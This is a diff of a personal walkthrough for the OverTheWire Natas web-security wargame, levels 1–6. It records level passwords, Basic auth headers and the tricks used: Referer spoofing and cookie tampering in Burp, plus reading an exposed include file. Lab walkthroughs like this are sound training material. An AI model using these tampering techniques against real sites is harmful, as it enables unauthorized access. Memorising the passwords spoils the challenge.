@@ -76,7 +76,7 @@ URL:      http://natas1.natas.labs.overthewire.org
 
 ---
 
-# Natas Level 1 → Level 2
+## Natas Level 1 → Level 2 `add /files to the end of the URL.`
 Username: natas2
 URL:      http://natas2.natas.labs.overthewire.org
 ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi
@@ -112,11 +112,10 @@ mallory:9urtcpzBmH
 ```
 ---
 
-## Natas Level 2 → Level 3
+## Natas Level 2 → Level 3 `http://natas3.natas.labs.overthewire.org/robots.txt`
 Username: natas3
 URL:      http://natas3.natas.labs.overthewire.org
 sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
-
 
 ```py
 -------------------------------------------------------------------
@@ -148,18 +147,134 @@ natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
 
 ---
 
-## Natas Level 3 → Level 4
+## Natas Level 3 → Level 4 `use brup to intercept request, update Referer url.`
 Username: natas4
 URL:      http://natas4.natas.labs.overthewire.org
 Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
 
-- Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"
+“HTTP Referrer”.
+- set up firefox and brup
+- making sure our proxy is set up for localhost @ 127.0.0.1.
 
+```py
+"Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/""
+--------------------------------------------------------
+goto http://natas4.natas.labs.overthewire.org/
+press Refresh page
+--------------------------------------------------------
+brup > proxy > intercept > Raw:
 
+GET / HTTP/1.1
+GET /index.php HTTP/1.1
+Host: natas4.natas.labs.overthewire.org
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:73.0) Gecko/20100101 Firefox/73.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Authorization: Basic bmF0YXM0Olo5dGtSa1dtcHQ5UXI3WHJSNWpXUmtnT1U5MDFzd0Va
+Connection: close
+Referer: http://natas4.natas.labs.overthewire.org/index.php
+Upgrade-Insecure-Requests: 1
+--------------------------------------------------------
+change it to:
+Referer: http://natas5.natas.labs.overthewire.org/
+--------------------------------------------------------
+"Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq"
+```
 
+Note: Once done, go back to Network Settings and select “Use System Proxy Settings” so you can have a normal connection, without it routing through Burp.
 
+---
 
+## Natas Level 4 → Level 5
+Username: natas5
+URL:      http://natas5.natas.labs.overthewire.org
+iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
 
+```py
+# send the passwd turn
+GET / HTTP/1.1
+Host: natas5.natas.labs.overthewire.org
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:73.0) Gecko/20100101 Firefox/73.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+Authorization: Basic bmF0YXM1OmlYNklPZm1wTjdBWU9RR1B3dG4zZlhwYmFKVkpjSGZx
+
+# refresh the Page
+GET / HTTP/1.1
+Host: natas5.natas.labs.overthewire.org
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:73.0) Gecko/20100101 Firefox/73.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Authorization: Basic bmF0YXM1OmlYNklPZm1wTjdBWU9RR1B3dG4zZlhwYmFKVkpjSGZx
+Connection: close
+Cookie: loggedin=0
+Upgrade-Insecure-Requests: 1
+--------------------------------------------------------
+# the packet header stores cookie information.
+# change loggedin=0 to loggedin=1, and Forward that packet.
+--------------------------------------------------------
+"Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1"
+```
+
+## Natas Level 5 → Level 6
+Username: natas6
+URL:      http://natas6.natas.labs.overthewire.org
+aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
+
+```py
+--------------------------------------------------------
+<body>
+<h1>natas6</h1>
+<div id="content">
+
+<form method=post>
+Input secret: <input name=secret><br>
+<input type=submit name=submit>
+</form>
+
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>  #!!!!!!!
+</div>
+</body>
+--------------------------------------------------------
+goto:
+http://natas6.natas.labs.overthewire.org/index-source.html
+--------------------------------------------------------
+include "includes/secret.inc";
+# the PHP is including a link to a file stored on the webpage /includes/secret.inc.
+    if(array_key_exists("submit", $_POST)) {
+        if($secret == $_POST['secret']) {
+        print "Access granted. The password for natas7 is <censored>";
+    } else {
+        print "Wrong secret";
+    }
+    }
+?>
+<form method=post>
+Input secret: <input name=secret><br>
+<input type=submit name=submit>
+</form>
+
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+--------------------------------------------------------
+goto:
+http://natas6.natas.labs.overthewire.org/includes/secret.inc
+--------------------------------------------------------
+<?
+$secret = "FOEIUWGHFEEUHOFUOIU";
+?>
+--------------------------------------------------------
+"Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9"
+```
+
+## 
 
 
 
